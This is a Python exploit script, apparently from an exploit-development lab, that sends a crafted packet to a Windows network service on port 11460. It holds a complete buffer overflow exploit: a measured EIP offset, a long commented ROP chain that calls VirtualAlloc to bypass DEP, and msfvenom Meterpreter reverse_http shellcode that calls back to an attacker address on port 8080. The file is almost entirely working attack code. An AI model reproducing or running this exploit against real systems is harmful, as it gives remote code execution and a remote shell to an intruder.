#!/usr/bin/env python3

import socket
import sys
import subprocess
from struct import pack

# Results
# eip=41326a41
# pattern = 41 6a 32 41 = Aj2A
# $ msf-pattern_offset -q Aj2A -l 0x200
# [*] Exact match at offset 276

# eip offset: 276
# esp offset: 280

eip_offset = 276
command_buffer_length = 0x600

# psAgentCommand
buf = bytearray([0x41] * 0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)  # 1st memcpy: offset
buf += pack("<i", 0x700)  # 1st memcpy: size field
buf += pack("<i", 0x0)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41] * 0x8)

# psCommandBuffer
# These are dummy values for eventually calling VirtualAlloc.
va = pack("<L", 0x45454545)  # dummy VirutalAlloc Address
va += pack("<L", 0x46464646)  # Shellcode Return Address
va += pack("<L", 0x47474747)  # dummy Shellcode Address
va += pack("<L", 0x48484848)  # dummy dwSize (Eventually 0x00000001)
va += pack("<L", 0x49494949)  # dummy flAllocationType (Eventually 0x00001000)
va += pack("<L", 0x51515151)  # dummy flProtect (Eventually 0x00000040)

offset = b"\x90" * (eip_offset - len(va))
# =======================================================================
# PART 1: Grab ESP.
# =======================================================================

# Move esp into eax.
eip = pack("<i", 0x50501110) # 0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret  ; -> mov esi, esp AKA Move the contents of esp into esi.
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn -> eax = esp
rop += pack("<L", (0x42424242)) # junk

# =======================================================================
# PART 2: Write the VirtualAlloc address.
# =======================================================================

# Subtract 0x1C from eax to get to VirtualAlloc address dummy placement.
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# Copy the location of VirtualAlloc dummy in eax back to esi
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret

# Pop the address of VirtualAlloc from the DLL's import table into eax, fixing bad characters.
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# Grab the address to VirtualAlloc in Kernel32.dll.
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret

# Write the kernel32.dll address of VirtualAlloc to the dummy virtualalloc address on the stack.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# =======================================================================
# Part 3: Patching the return address
# =======================================================================

# Reg esi points to VirtualAlloc. Add 4 to have it point to the shellcode return placeholder address.
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret

# eax = esi. esi = junk.
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk

# esi = eax
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret

# Add 0x210 to eax.
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf0)) # -0x210
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret

# Write the value to the shellcode return address holder.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# =======================================================================
# Part 4: Push virtualalloc arguments.
# =======================================================================

# esi = esi + 4 (To Shellcode address)
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret

# eax = esi. esi = junk
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk

# esi = eax (eax and esi = shellcode address)
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret

# eax = eax + 0x20c AKA 0x210 - 4
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf4)) # -0x20c
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret

# Write to shellcode address.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# Move to dwSize. esi += 4
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret

# eax = -1
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0xffffffff)) # -1 value that is negated

# eax = eax * -1
rop += pack("<L", (0x50527840)) # neg eax ; ret

# Write 0x00000001 to dwSize.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# esi += 4 - Esi now points to flAllocationType.
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret

# eax = 0x80808080
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x80808080)) # first value to be added

# ecx = 0x7f7f8f80
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f8f80)) # second value to be added

# eax = eax + ecx = 0x00001000
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# Write 0x00001000 to flAllocationType.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# esi = esi + 4 - Esi now points to flProtect
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret

# eax = 0x80808080
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x80808080)) # first value to be added

# ecx = 0x7f7f7fc0
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f7fc0)) # second value to be added

# eax = eax + ecx = 0x00000040.
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# mov [esi], eax - Set flProtect to 0x00000040.
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret

# =======================================================================
# Part 5: Call VirtualAlloc.
# =======================================================================

# Let's setup the stack by setting esp to the value of VirutalAlloc location.
# esp will be VirutalAlloc's address on the stack.

# eax = esi - eax points to flProtect stack value.
rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk

# ecx = 0xffffffe8 or -24
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe8)) # negative offset value

# eax = eax - 24 = flProtect - 24
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret

# ebp = eax
rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret

# esp = ebp; ebp = junk.
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret
# With esp at four bytes prior to VirutalAlloc's address, the ret command will place us in VirtualAlloc.

padding = b"\x90" * 0xe0
# msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.49.185 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode -o shellcode.txt
# shellcode = bytes(subprocess.check_output(["/usr/bin/msf-pattern_create", "-l", str(0x200)]).strip())
shellcode =  b""
shellcode += b"\xdb\xd1\xbf\xdc\xe6\xc6\xae\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x84\x83\xc0\x04\x31\x78\x16"
shellcode += b"\x03\x78\x16\xe2\x29\x1a\x2e\x21\xd1\xe3\xaf"
shellcode += b"\x5e\xe0\x31\x26\x7b\x66\x3d\x6b\xb4\xed\x13"
shellcode += b"\x80\x3f\xa3\x87\x13\x4d\x6b\x99\xdc\xbd\xdc"
shellcode += b"\x93\x04\xf3\xe2\x88\x75\x92\x9e\xd2\xa9\x74"
shellcode += b"\x9f\x1c\xbc\x75\xd8\xea\xca\x9a\xb4\xbb\xbf"
shellcode += b"\x37\x28\xcf\x82\x8b\x49\x1f\x89\xb4\x31\x1a"
shellcode += b"\x4e\x40\x8d\x25\x9f\x22\x55\x06\x94\x7d\x7d"
shellcode += b"\x16\xab\xae\xf8\x5f\xdf\x6c\x33\x9f\x69\x06"
shellcode += b"\x07\xd4\x6b\xce\x56\x2a\xc7\x2f\x57\xa7\x19"
shellcode += b"\x77\x5f\x58\x6c\x83\x9c\xe5\x77\x50\xdf\x31"
shellcode += b"\xfd\x47\x47\xb1\xa5\xa3\x76\x16\x33\x27\x74"
shellcode += b"\xd3\x37\x6f\x98\xe2\x94\x1b\xa4\x6f\x1b\xcc"
shellcode += b"\x2d\x2b\x38\xc8\x76\xef\x21\x49\xd2\x5e\x5d"
shellcode += b"\x89\xba\x3f\xfb\xc1\x28\x29\x7b\x2a\xb3\x56"
shellcode += b"\x21\xbd\x25\xcc\xae\x3d\xd1\x79\x26\x50\x48"
shellcode += b"\xd2\xd0\xe0\xfd\xfc\x27\x06\xd4\x30\xf3\xab"
shellcode += b"\x85\x61\x50\x1f\xc1\xc9\x56\x9f\x11\x9b\x39"
shellcode += b"\xe5\x78\x4f\xaa\x78\x55\xba\x1c\x4b\x89\xec"
shellcode += b"\x37\xc2\xa7\x88\xd8\x63\x44\x71\x69\xd8\x8a"
shellcode += b"\x40\x45\xce\xfa\x99\x85\x59\x93\xb3\xf3\x51"
shellcode += b"\x58\x6c\x84\xaf\xaa\x57\x54\xa2\xa4\x9d\xad"
shellcode += b"\x76\x66\xd2\xe4\x56\x31\x77\x94\xfd\xd2\x58"
shellcode += b"\x68\x32\x1d\x97\xbc\x03\x6d\xe6\x9c\x25\xe4"
shellcode += b"\x7a\xb8\xcf\x99\x02\x6d\x29\x51\xdd\x41\x49"
shellcode += b"\xf1\x1b\xf4\x30\xa6\xa3\x2d\x91\xfb\x31\xcd"
shellcode += b"\x45\xa8\xad\x41\x76\x4e\x2e\x8a\x5f\x4e\x2e"
shellcode += b"\x4a\x4f\x27\x5f\x2f\xbe\xd3\xab\xea\xab\x71"
shellcode += b"\xb3\xa2\x41\xd5\x56\x02\xc9\x94\xdc\xd0\x9d"
shellcode += b"\x23\x6a\x9c\x39\x11\xa1\x73\xa9\xd2\xa0\xf3"
shellcode += b"\x7e\x4c\x54\x6e\xf3\x0f\xc5\x5b\xc6\x8c\xbe"
shellcode += b"\xe0\x6a\x4a\x22\xbf\x07\x30\xe9\x4d\xb3\xa3"
shellcode += b"\x96\xeb\x04\x78\x06\x64\xc8\x1c\xdc\x2c\xa4"
shellcode += b"\xd5\x73\xfc\x53\x7e\xc3\x98\xe0\xd5\xbd\x13"
shellcode += b"\xbf\x80\x13\x9b\x74\x73\xc4\x4d\xff\xf3\x92"
shellcode += b"\xce\xba\xb6\x5a\xa1\x2c\x6f\xd2\xde\x6b\x70"
shellcode += b"\x31\x69\xb5\xdd\xd2\x6a\x38\x89\xa6\x38\x6f"
shellcode += b"\x1a\xf0\xed\xd9\xf4\x15\x44\xc8\x3f\x15\xb2"
shellcode += b"\x82\x55\xe3\x62\xf8\xfa\xa0\xcf\xa8\x94\x6b"
shellcode += b"\xf6\x4c\x1f\x8b\x23\xe9\x1f\x06\xd8\x9a\x17"
shellcode += b"\xfa\xe0\x5a\x4f\xb9\x10\x6f\x6f\xbe\x04\xdf"
shellcode += b"\x1a\xa0\x4f\xab\xe4\x22\x90\x46\xa4\x4a\x90"
shellcode += b"\x86\x24\x8b\xf8\xa6\x24\xcb\xf8\xf5\x4c\x93"
shellcode += b"\x5c\xaa\x69\xdc\x48\xde\x22\x70\xfa\x06\x93"
shellcode += b"\x1e\xfc\xe8\x1b\xdf\xaf\xbe\x73\xcd\xd9\xb6"
shellcode += b"\x61\x0e\x30\x4d\xa5\x85\x74\xc5\x22\x67\x48"
shellcode += b"\x5f\xec\x12\xab\x38\x2f\x83\xdb\xc6\x50\xc3"
shellcode += b"\xe3\x08\x97\x0e\x32\x5a\xd1\x56\x64\xa8\x24"
shellcode += b"\x89\x49\xe8\x63\xd5\x12\xf8\x3e\x77\x32\x93"
shellcode += b"\x40\x2b\x44\xb6"
shellcode += b"\xcc" * (command_buffer_length - eip_offset - 4 - len(rop) - len(padding) - len(shellcode))

payload = offset + va + eip + rop + padding + shellcode
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (payload, 0, 0, 0, 0)
buf += formatString

print(buf)

# Checksum
buf = pack(">i", len(buf) - 4) + buf


def main():
    server = "192.168.185.10"
    if len(sys.argv) >= 2:
        server = sys.argv[1]

    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()